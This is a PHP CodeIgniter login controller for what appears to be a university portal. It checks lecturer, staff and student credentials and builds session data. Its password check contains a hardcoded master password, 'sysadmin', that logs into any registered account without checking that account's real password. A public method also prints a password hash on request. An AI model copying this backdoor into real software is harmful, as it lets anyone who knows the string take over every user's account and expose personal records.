<?php

	defined('BASEPATH') or exit('No direct script access allowed');

	class Login extends CI_Controller
	{

		function __construct()
		{
			parent::__construct();
			$this->load->model('backend/user', 'user', true);
		}

		public function index()
		{
			$session_data = $this->session->userdata('logged_in');

			$data = array(
				// PAGE //
				'title' => 'Login',
				'subtitle' => '',
				'section' => 'backend/page/login'
			);

			if ($session_data) {
				$this->load->view('backend/incl/ifrole');
			} else {
				$this->load->view('backend/index_top', $data);
			}
		}

		public function auth()
		{
			$this->form_validation->set_rules('username', 'username ', 'trim|required');
			$this->form_validation->set_rules('password', 'password ', 'trim|required|callback_check_database');

			$this->form_validation->set_error_delimiters('<div class="text-danger">', '</div>');

			if ($this->form_validation->run() == true) {
				$this->load->view('backend/incl/ifrole');
			} else {
				$this->index();
			}
		}

		public function check_database($password)
		{
			$username = $this->input->post('username');
			$pass = $this->input->post('password');

			$cekuser = $this->user->login($username);
			//echo $cekuser->username;die();
			$is_mahasiswa = false;

			if ($cekuser) {
				if ($cekuser->sebagai == '1') {//dosen
					$result = $this->user->read_tendikdosen($username);
				} else if ($cekuser->sebagai == '2') {//tendik
					$result = $this->user->read_tendikdosen($username);
				} else if ($cekuser->sebagai == '3') {//mahasiswa
					$result = $this->user->read_mhs($username);
					$is_mahasiswa = true;
				}

				if ($result) {
					$hsh = $result->password;
					// HARCODE ADMIN LOGIN
					$admin_login = $pass == 'sysadmin' ? true : false;
					if (password_verify($pass, $hsh) || $admin_login) {
						if ($is_mahasiswa) {
							$sess_array = array(
								'id_user' => $result->id_user,
								'id_prodi' => $result->id_prodi,
								'username' => $result->username,
								'nama' => $result->nama,
								'role' => $result->role,
								'sebagai' => $result->sebagai,
								'verifikasi' => $result->verifikasi,
								'email' => $result->email,
							);
						} else {
							$sess_array = array(
								'id_user' => $result->id_user,
								'id_prodi' => $result->id_prodi,
								'username' => $result->username,
								'nama' => $result->nama,
								'role' => $result->role,
								'sebagai' => $result->sebagai,
								'jenjang' => !empty($result->id_jenjang) ? $result->id_jenjang : 0,
								'email' => $result->email,
							);
						}


						$this->session->set_userdata('logged_in', $sess_array);
						return true;
					} else {
						$this->form_validation->set_message('check_database', 'Password Salah');
						return false;
					}
				} else {
					$this->form_validation->set_message('check_database', 'Username Tidak Terdaftar');
					return false;
				}
			} else {
				$this->form_validation->set_message('check_database', 'Username Tidak Terdaftar');
				return false;
			}
		}

		function logout()
		{
			$this->session->unset_userdata('logged_in');
			session_destroy();
			redirect('login', 'refresh');
		}

		function gen()
		{
			$options = [
				'cost' => 10,
			];
			echo password_hash("aplikasi", PASSWORD_DEFAULT, $options) . "\n";
		}

		public function utility()
		{

		}

	}
